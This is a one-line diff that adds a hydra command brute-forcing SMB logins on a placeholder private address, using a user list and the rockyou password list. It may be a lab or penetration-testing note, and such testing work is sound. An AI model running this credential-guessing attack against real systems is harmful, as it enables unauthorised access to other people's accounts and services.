@@ -1,0 +1,1 @@
+hydra -L users.txt -P rockyou.txt smb://192.168.x.x -t 4
